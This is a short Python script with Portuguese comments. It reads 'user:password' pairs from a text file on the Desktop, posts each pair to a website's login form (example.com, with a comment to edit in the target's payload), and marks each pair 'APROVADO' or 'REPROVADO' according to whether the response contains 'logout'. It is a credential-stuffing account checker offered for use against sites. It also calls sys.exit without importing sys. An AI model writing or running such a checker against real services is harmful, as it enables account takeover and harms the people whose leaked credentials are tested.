# -*- coding: iso-8859-1 -*-

import requests
import os


# Obtém o caminho completo para o arquivo "usuarios.txt" na sua área de trabalho
usuarios_path = os.path.join(os.path.expanduser('~'), 'Desktop', 'usuarios.txt')

# Verifica se o arquivo existe antes de abri-lo
if not os.path.exists(usuarios_path):
    print("O arquivo usuarios.txt não foi encontrado!")
    sys.exit()

# Loop para executar o código enquanto houverem linhas para ler no arquivo de bloco de notas
usuarios_lista = []
with open(usuarios_path, 'r') as arquivo:
    usuarios_lista = arquivo.readlines()

for usuario_senha in usuarios_lista:
    # Separar usuário e senha pelo caractere ':'
    usuario, senha = usuario_senha.strip().split(':')

    # Dados para fazer a solicitação POST para o formulário de login
    # Edite com o payload do website
    data = {
        'login': usuario,
        'pass': senha
    }

    # Enviar a solicitação POST para o formulário de login
    response = requests.post("http://example.com/", data=data)

            # Verificar se o login foi bem-sucedido
    if 'logout' in response.text:
        print(f'{usuario}:{senha} APROVADO')
    else:
        print(f'{usuario}:{senha} REPROVADO')
